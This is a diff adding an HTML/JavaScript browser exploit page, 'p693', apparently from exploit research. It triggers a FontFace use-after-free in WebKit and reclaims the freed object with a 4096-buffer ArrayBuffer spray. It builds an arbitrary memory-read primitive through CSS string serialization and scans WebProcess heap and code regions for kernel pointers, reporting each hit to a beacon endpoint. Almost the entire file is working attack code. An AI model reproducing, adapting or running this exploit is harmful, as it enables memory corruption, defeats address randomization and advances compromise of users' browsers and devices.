@@ -1,0 +1,362 @@
+<!--
+  p693: WebProcess Kernel Pointer Scanner
+
+  Uses FontFace UAF + forgeRead to scan WebProcess data/heap regions
+  for kernel-range pointers (0xFFFF8xxx_xxxxxxxx). WebProcess may have
+  kernel pointers that the Lua loader process doesn't — GPU driver
+  communication, IPC handles, mmap'd regions.
+
+  Strategy:
+    1. FontFace UAF trigger (same as p692)
+    2. ArrayBuffer(192) spray reclaim
+    3. Walk chain to verify forgeRead works (read VP)
+    4. Scan WebProcess memory regions for kernel pointers
+    5. Report any findings
+
+  CRASH_CLASS: HIGH (UAF trigger, forged pointer reads)
+-->
+<!DOCTYPE html><html><head><meta charset="utf-8">
+<meta http-equiv="Cache-Control" content="no-cache,no-store,must-revalidate">
+<title>p693</title></head>
+<body><pre id="out">p693: WebProcess Kernel Pointer Scanner</pre>
+<script>
+'use strict';
+var O=document.getElementById('out');
+function say(s){O.textContent+='\n'+s;}
+var _imgs=[];for(var i=0;i<600;i++)_imgs.push(new Image());
+var _ix=0;
+function bk(tag,d){
+  var msg='P693-'+tag+(d!==undefined?'-'+String(d).slice(0,800):'');
+  say(msg);
+  try{_imgs[_ix++%600].src='/beacon?m='+encodeURIComponent(msg)+'&t='+Date.now();}catch(e){}
+}
+function bkSync(tag,d){
+  var msg='P693-'+tag+(d!==undefined?'-'+String(d).slice(0,800):'');
+  say(msg);
+  try{var x=new XMLHttpRequest();x.open('GET','/beacon?m='+encodeURIComponent(msg)+'&t='+Date.now(),false);x.send(null);}catch(e){}
+}
+
+/* ---- BigInt / pointer helpers ---- */
+var _b8=new ArrayBuffer(8),_f64=new Float64Array(_b8),_u32=new Uint32Array(_b8);
+function f2i(f){_f64[0]=f;return [_u32[1],_u32[0]];}
+function i2f(hi,lo){_u32[1]=hi;_u32[0]=lo;return _f64[0];}
+function hex64(f){var p=f2i(f);return '0x'+('00000000'+p[0].toString(16)).slice(-8)+('00000000'+p[1].toString(16)).slice(-8);}
+function hexQ(hi,lo){return '0x'+('00000000'+(hi>>>0).toString(16)).slice(-8)+('00000000'+(lo>>>0).toString(16)).slice(-8);}
+function addQ(hi,lo,d){
+  var nl=(lo>>>0)+(d|0);
+  var nh=(hi>>>0);
+  if(nl<0){nh--;nl+=0x100000000;}
+  while(nl>=0x100000000){nh++;nl-=0x100000000;}
+  return[nh>>>0,nl>>>0];
+}
+function subQ(ahi,alo,bhi,blo){
+  var nl=(alo>>>0)-(blo>>>0);
+  var nh=(ahi>>>0)-(bhi>>>0);
+  if(nl<0){nh--;nl+=0x100000000;}
+  return[nh>>>0,nl>>>0];
+}
+function hexByte(v){return('0'+((v&0xFF).toString(16))).slice(-2);}
+function bytesToHex(arr,off,len){
+  var s='';for(var i=0;i<len;i++)s+=hexByte(arr[off+i]|0);return s;
+}
+
+/* ---- CSS escape sequence decoder ---- */
+function decodeCSSString(cssStr){
+  var bytes=[];
+  var i=0;
+  while(i<cssStr.length){
+    if(cssStr.charAt(i)==='\\'){
+      i++;
+      var hexStr='';
+      for(var j=0;j<6&&i<cssStr.length;j++){
+        var c=cssStr.charAt(i);
+        if((c>='0'&&c<='9')||(c>='a'&&c<='f')||(c>='A'&&c<='F')){
+          hexStr+=c;i++;
+        }else{break;}
+      }
+      if(hexStr.length>0){
+        var codepoint=parseInt(hexStr,16);
+        bytes.push(codepoint&0xFF);
+        if(i<cssStr.length&&cssStr.charAt(i)===' ')i++;
+      }else{
+        if(i<cssStr.length){bytes.push(cssStr.charCodeAt(i)&0xFF);i++;}
+      }
+    }else{
+      bytes.push(cssStr.charCodeAt(i)&0xFF);
+      i++;
+    }
+  }
+  return bytes;
+}
+function readQFromBytes(arr,off){
+  if(off+8>arr.length)return[0,0];
+  var lo=(arr[off]|0)+((arr[off+1]|0)<<8)+((arr[off+2]|0)<<16)+((arr[off+3]|0)*0x1000000);
+  var hi=(arr[off+4]|0)+((arr[off+5]|0)<<8)+((arr[off+6]|0)<<16)+((arr[off+7]|0)*0x1000000);
+  return[hi>>>0,lo>>>0];
+}
+function writeQToBytes(arr,off,hi,lo){
+  arr[off]=lo&0xFF;arr[off+1]=(lo>>>8)&0xFF;arr[off+2]=(lo>>>16)&0xFF;arr[off+3]=(lo>>>24)&0xFF;
+  arr[off+4]=hi&0xFF;arr[off+5]=(hi>>>8)&0xFF;arr[off+6]=(hi>>>16)&0xFF;arr[off+7]=(hi>>>24)&0xFF;
+}
+
+/* ---- Retained refs to prevent GC ---- */
+var retained=[];
+
+/* ---- FontFace UAF trigger (CVE-2026-43720: getContext reentry) ---- */
+function triggerFontFaceUAF(){
+  try{delete FontFace.prototype.then;}catch(e){}
+
+  var gSa, gPa;
+  try{
+    gSa=new FontFace('sa','local(Arial)',{unicodeRange:'U+0041-005A'});
+    gPa=new FontFace('pa','local(Arial)',{unicodeRange:'U+0061-007A'});
+  }catch(e){bk('FAIL','fontface-ctor: '+e.message);return null;}
+
+  document.fonts.add(gSa);
+  document.fonts.add(gPa);
+  retained.push(gSa,gPa);
+
+  return new Promise(function(resolve){
+    gSa.loaded.then(function(){
+      gPa.loaded.then(function(){
+        bk('RES','n2');
+        resolve({sa:gSa,pa:gPa});
+      });
+    });
+  });
+}
+
+/* ---- Spray and reclaim ---- */
+function sprayReclaim(face,sprayCount){
+  var L1=[0,0],L2=[0,0];
+  var bufs=[];
+  var MARKER_HI=0xDEAD0693,MARKER_LO=0xCAFE0000;
+
+  for(var i=0;i<sprayCount;i++){
+    var ab=new ArrayBuffer(192);
+    var u8=new Uint8Array(ab);
+    var dv=new DataView(ab);
+    dv.setUint32(0x38+4,MARKER_HI,true);
+    dv.setUint32(0x38,MARKER_LO+i,true);
+    bufs.push({ab:ab,u8:u8,dv:dv,idx:i});
+    retained.push(ab);
+  }
+
+  try{var sty=face.style;}catch(e){}
+
+  var hitIdx=-1;
+  for(var i=0;i<bufs.length;i++){
+    var dv=bufs[i].dv;
+    var mhi=dv.getUint32(0x38+4,true);
+    var mlo=dv.getUint32(0x38,true);
+    if(mhi!==MARKER_HI||(mlo&0xFFFF0000)!==(MARKER_LO&0xFFFF0000)){
+      hitIdx=i;
+      var t58hi=dv.getUint32(0x58+4,true);
+      var t58lo=dv.getUint32(0x58,true);
+      var t68hi=dv.getUint32(0x68+4,true);
+      var t68lo=dv.getUint32(0x68,true);
+      L1=[t58hi,t58lo];
+      L2=[t68hi,t68lo];
+      break;
+    }
+  }
+
+  if(hitIdx<0){bk('FAIL','no-reclaim');return null;}
+  bk('L1',hexQ(L1[0],L1[1]));
+  bk('L2',hexQ(L2[0],L2[1]));
+  bk('FORGED',hitIdx);
+
+  return{bufs:bufs,hitIdx:hitIdx,hitBuf:bufs[hitIdx],L1:L1,L2:L2};
+}
+
+/* ---- forgeRead: read bytes from target address via CSS serialization ---- */
+function forgeRead(ctx,targetHi,targetLo){
+  var hitBuf=ctx.hitBuf;
+  var dv=hitBuf.dv;
+  var metaAddr=addQ(targetHi,targetLo,-0x10);
+  dv.setUint32(0x58+4,metaAddr[0],true);
+  dv.setUint32(0x58,metaAddr[1],true);
+  try{
+    var raw=ctx.face.style;
+    return raw;
+  }catch(e){
+    return null;
+  }
+}
+
+function restoreBuffer(ctx){
+  writeQToBytes(ctx.hitBuf.u8,0x58,ctx.L1[0],ctx.L1[1]);
+  writeQToBytes(ctx.hitBuf.u8,0x68,ctx.L2[0],ctx.L2[1]);
+}
+
+function readQword(ctx,hi,lo){
+  var raw=forgeRead(ctx,hi,lo);
+  restoreBuffer(ctx);
+  if(!raw)return null;
+  var bytes=decodeCSSString(raw);
+  if(bytes.length<8)return null;
+  return readQFromBytes(bytes,0);
+}
+
+function readBytes(ctx,hi,lo,count){
+  var raw=forgeRead(ctx,hi,lo);
+  restoreBuffer(ctx);
+  if(!raw)return null;
+  var bytes=decodeCSSString(raw);
+  return bytes;
+}
+
+function isKernelPtr(hi,lo){
+  return (hi>>>0)>=0xFFFF8000 && lo!==0 &&
+         !((hi===0xFFFFFFFF)&&(lo===0x00000000)) &&
+         !((hi===0xFFFFFFFF)&&(lo===0xFFFFFFFF));
+}
+
+/* ---- Walk chain to verify forgeRead works ---- */
+function walkChain(ctx){
+  var L1=ctx.L1;
+  bk('WALK','start');
+  var hashAddr=addQ(L1[0],L1[1],-0x10);
+  var r1=forgeRead(ctx,hashAddr[0],hashAddr[1]);
+  restoreBuffer(ctx);
+  if(!r1){bk('WALK-FAIL','r1');return null;}
+  var r1hex=decodeCSSString(r1);
+  bkSync('IHT','len='+r1hex.length+',css='+r1.length);
+  if(r1hex.length<24){bk('WALK-FAIL','short-r1');return null;}
+
+  var IM=null;
+  for(var i=0x10;i<r1hex.length-7;i+=8){
+    var q=readQFromBytes(r1hex,i);
+    if(q[0]>0&&q[0]<0x20&&q[1]!==0){
+      IM=q;bk('IM',hexQ(IM[0],IM[1]));break;
+    }
+  }
+  if(!IM){bk('WALK-FAIL','no-IM');return null;}
+
+  var r2=forgeRead(ctx,IM[0],addQ(IM[0],IM[1],8)[1]);
+  restoreBuffer(ctx);
+  if(!r2){bk('WALK-FAIL','r2');return null;}
+  var r2hex=decodeCSSString(r2);
+  var FO=readQFromBytes(r2hex,0);
+  if(FO[0]===0&&FO[1]===0){bk('WALK-FAIL','FO=0');return null;}
+  bk('FO',hexQ(FO[0],FO[1]));
+
+  var r3=forgeRead(ctx,FO[0],FO[1]);
+  restoreBuffer(ctx);
+  if(!r3){bk('WALK-FAIL','r3');return null;}
+  var r3hex=decodeCSSString(r3);
+  var VP=readQFromBytes(r3hex,0);
+  if(VP[0]<0x04||VP[0]>0x20){bk('WALK-FAIL','VP-bad');return null;}
+  bk('VP',hexQ(VP[0],VP[1]));
+
+  return{VP:VP};
+}
+
+/* ---- Kernel pointer scanner ---- */
+function scanRegion(ctx,startHi,startLo,size,label){
+  var found=[];
+  var CHUNK=64;
+  var steps=Math.floor(size/CHUNK);
+  if(steps>2048)steps=2048;
+  var errors=0;
+
+  for(var i=0;i<steps;i++){
+    var addr=addQ(startHi,startLo,i*CHUNK);
+    var raw=forgeRead(ctx,addr[0],addr[1]);
+    restoreBuffer(ctx);
+    if(!raw){errors++;if(errors>20)break;continue;}
+    var bytes=decodeCSSString(raw);
+    for(var j=0;j+8<=bytes.length;j+=8){
+      var q=readQFromBytes(bytes,j);
+      if(isKernelPtr(q[0],q[1])){
+        var at=addQ(addr[0],addr[1],j);
+        found.push({addr:at,val:q,region:label,offset:i*CHUNK+j});
+        bkSync('KPTR','at='+hexQ(at[0],at[1])+'-val='+hexQ(q[0],q[1])+'-'+label);
+      }
+    }
+    if(i>0&&i%256===0){
+      bk('SCAN-PROG',label+'-'+i+'/'+steps+'-found='+found.length+'-err='+errors);
+    }
+  }
+  bkSync('SCAN-REGION',label+'-done-'+steps+'steps-found='+found.length+'-err='+errors);
+  return found;
+}
+
+/* ---- Main ---- */
+function main(){
+  var runId=Math.random().toString(36).slice(2,8).toUpperCase();
+  bk('BOOT',runId);
+
+  triggerFontFaceUAF().then(function(faces){
+    if(!faces)return;
+    bk('UAF','triggered');
+
+    var ctx=sprayReclaim(faces.sa,4096);
+    if(!ctx)return;
+    ctx.face=faces.sa;
+
+    try{document.fonts.delete(faces.sa);}catch(e){}
+    bk('DEL-OK');
+
+    setTimeout(function(){
+      var chain=walkChain(ctx);
+      if(!chain){bk('CHAIN-FAIL');return;}
+      bk('CHAIN-OK','VP='+hexQ(chain.VP[0],chain.VP[1]));
+
+      setTimeout(function(){
+        bkSync('KPTR-SCAN','starting');
+        var allFound=[];
+
+        /* Phase 1: Scan around the VP (code segment nearby data) */
+        var vpBase=addQ(chain.VP[0],chain.VP[1],-0x100000);
+        var r1=scanRegion(ctx,vpBase[0],vpBase[1],0x200000,'VP-nearby');
+        allFound=allFound.concat(r1);
+
+        /* Phase 2: Scan around L1 (hash table area = heap) */
+        var heapBase=addQ(ctx.L1[0],ctx.L1[1],-0x40000);
+        var r2=scanRegion(ctx,heapBase[0],heapBase[1],0x80000,'heap-L1');
+        allFound=allFound.concat(r2);
+
+        /* Phase 3: Scan around L2 (WeakPtrImpl area = different heap) */
+        var weakBase=addQ(ctx.L2[0],ctx.L2[1],-0x40000);
+        var r3=scanRegion(ctx,weakBase[0],weakBase[1],0x80000,'heap-L2');
+        allFound=allFound.concat(r3);
+
+        /* Phase 4: Scan spray buffers themselves for leaked data */
+        for(var bi=0;bi<ctx.bufs.length&&bi<100;bi++){
+          if(bi===ctx.hitIdx)continue;
+          var dv=ctx.bufs[bi].dv;
+          for(var off=0;off<192;off+=8){
+            var qhi=dv.getUint32(off+4,true);
+            var qlo=dv.getUint32(off,true);
+            if(isKernelPtr(qhi,qlo)){
+              bkSync('KPTR-SPRAY','buf='+bi+'-off='+off+'-val='+hexQ(qhi,qlo));
+              allFound.push({addr:[0,bi*192+off],val:[qhi,qlo],region:'spray',offset:off});
+            }
+          }
+        }
+
+        /* Phase 5: Scan low heap (common WebKit bmalloc region ~0x10000xxxxx) */
+        var lowHeap=[0x10,0x00100000];
+        var r5=scanRegion(ctx,lowHeap[0],lowHeap[1],0x100000,'low-heap');
+        allFound=allFound.concat(r5);
+
+        /* Summary */
+        bkSync('KPTR-TOTAL',allFound.length);
+        if(allFound.length>0){
+          var summary='';
+          for(var i=0;i<Math.min(allFound.length,20);i++){
+            var f=allFound[i];
+            summary+=hexQ(f.val[0],f.val[1])+'@'+f.region+'+'+f.offset+';';
+          }
+          bkSync('KPTR-SUMMARY',summary);
+        }
+
+        bkSync('DONE',runId+'-found='+allFound.length);
+      },100);
+    },200);
+  });
+}
+
+try{main();}catch(e){bk('FATAL',e.message);}
+</script></body></html>
